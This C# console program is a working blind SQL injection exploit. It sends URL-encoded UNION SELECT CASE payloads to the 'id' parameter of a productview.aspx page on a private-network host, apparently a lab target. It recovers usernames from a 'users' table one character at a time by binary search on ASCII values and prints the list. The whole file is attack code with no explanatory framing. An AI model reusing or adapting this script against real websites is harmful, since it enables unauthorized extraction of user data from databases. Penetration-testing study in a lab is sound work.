using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace SqlInjectionGetUsername
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> foundUsernames = new List<string>();
            int userNumber = 0;
            bool usernameNotEmpty = false;
            do
            {

                string usernameResult = string.Empty;
                bool running = false;
                int jump = 128;
                int position = 1;
                int charValue = 0;

                do
                {
                    string url = $"http://172.16.21.19/productview.aspx?id=0%20union%20all%20select%20(SELECT%20CASE%20WHEN%20ISNULL(ASCII(SUBSTRING((select%20top%201%20Username%20from%20users%20where%20Username%20not%20in%20(select%20top%20{userNumber}%20Username%20from%20users)),{position},%201)),%200)%20=%20{charValue}%20THEN%20%271%27%20ELSE%20(SELECT%20CASE%20WHEN%20ISNULL(ASCII(SUBSTRING((select%20top%201%20Username%20from%20users%20where%20Username%20not%20in%20(select%20top%20{userNumber}%20Username%20from%20users)),%20{position},%201)),%200)%20%3E%20{charValue}%20THEN%20%272%27%20ELSE%20%270%27%20END)%20END),%27%27,%27%27";
                    // Create a request for the URL. 		
                    WebRequest request = WebRequest.Create(url);
                    // If required by the server, set the credentials.
                    request.Credentials = CredentialCache.DefaultCredentials;
                    // Get the response.
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    // Get the stream containing content returned by the server.
                    Stream dataStream = response.GetResponseStream();
                    // Open the stream using a StreamReader for easy access.
                    StreamReader reader = new StreamReader(dataStream);
                    // Read the content.
                    string responseFromServer = reader.ReadToEnd();
                    // Display the content.
                    //Console.WriteLine(responseFromServer);

                    string[] testArray = responseFromServer.Split(new string[] { "id=\"ProductHeader\" class=\"h4\">" }, StringSplitOptions.None);
                    string queryResult = testArray[1].Substring(0, 1);



                    // Cleanup the streams and the response.
                    reader.Close();
                    dataStream.Close();
                    response.Close();

                    running = !(charValue == 0 && queryResult == "1");

                    if (queryResult == "2")
                    {
                        charValue += jump;
                    }
                    else if (queryResult == "0")
                    {
                        charValue -= jump;
                    }

                    if (queryResult != "1" && jump > 1)
                    {
                        jump = jump / 2;
                    }
                    else
                    {
                        char character = (char)charValue;
                        string text = character.ToString();
                        Console.WriteLine("Character found: " + text);
                        usernameResult += text;

                        position++;
                        charValue = 0;
                        jump = 128;
                    }



                } while (running);

                usernameNotEmpty = usernameResult.Length > 1;
                if (usernameNotEmpty)
                {
                    foundUsernames.Add(usernameResult);
                    userNumber++;
                }
                
            } while (usernameNotEmpty);

            Console.WriteLine("Users found: " + (userNumber));
            Console.WriteLine();
            Console.WriteLine("Found usernames:");

            foreach (string name in foundUsernames)
            {
                Console.WriteLine("Username: " + name);
            }

            Console.ReadLine();
        }
    }
}
